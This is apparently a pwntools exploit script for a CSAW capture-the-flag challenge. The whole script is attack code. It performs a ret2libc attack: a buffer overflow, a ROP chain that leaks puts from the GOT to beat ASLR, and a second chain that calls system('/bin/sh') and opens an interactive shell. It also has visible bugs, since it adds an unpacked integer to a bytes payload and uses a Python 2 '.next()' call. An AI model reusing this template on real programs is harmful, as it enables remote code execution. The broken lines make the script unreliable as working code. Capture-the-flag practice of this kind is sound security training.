#! /usr/bin/env python
from pwn import *

program = "./rop"
#proc = process(program)
proc=remote("pwn.chal.csaw.io",5016)

elf_prog = ELF(program)

libc = ELF("./libc-2.27.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
got_puts = elf_prog.got['puts']
plt_puts = elf_prog.plt['puts']
main = elf_prog.symbols['main']

gadget1 = 0x0400683 # pop rdi ; ret

payload = b'A'*40
align_gadget = 0x0040048e 
#use to obtain libc base address, which is random for every execution due to ASLR.
payload += align_gadget + p64(gadget1) + p64(got_puts) + p64(plt_puts) + p64(main) 

print(payload)

proc.sendlineafter('Hello\n', payload)

base = proc.recvline()

libc_puts = u64(base[:-1].ljust(8, b'\x00'))
#obtain the base address of libc, calculate correct system function address and string "/bin/sh" address
libc_base = libc_puts - libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + libc.search('/bin/sh').next()

print('libc_base: ' + str(hex(libc_base)))
print('libc_system: ' + str(hex(libc_system)))
print('libc_binsh: ' + str(hex(libc_binsh)))

payload = b'A'*40 
payload += p64(gadget1) + p64(libc_binsh) + p64(libc_system)
print(payload)
proc.sendlineafter('Hello\n', payload)
proc.sendline("ls")
proc.interactive()